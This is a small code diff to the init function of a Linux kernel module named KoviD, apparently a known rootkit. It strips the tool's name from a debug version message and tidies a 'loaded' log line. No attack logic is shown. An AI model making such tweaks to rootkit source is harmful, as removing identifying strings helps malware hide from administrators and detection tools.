@@ -774,7 +774,7 @@ static int __init kv_init(void) {
 #endif
 
     /** show current version for when running in debug mode */
-    prinfo("KoviD version %s\n", KOVID_VERSION);
+    prinfo("version %s\n", KOVID_VERSION);
 
     if (strlen(PROCNAME) == 0) {
         procname_err = "Empty PROCNAME build parameter. Check Makefile.";
@@ -843,7 +843,7 @@ cont:
     op_lock = 1;
 #endif
 
-    prinfo(KERN_INFO "loaded.\n");
+    prinfo("loaded.\n");
     goto leave;
 
 unroll_init:
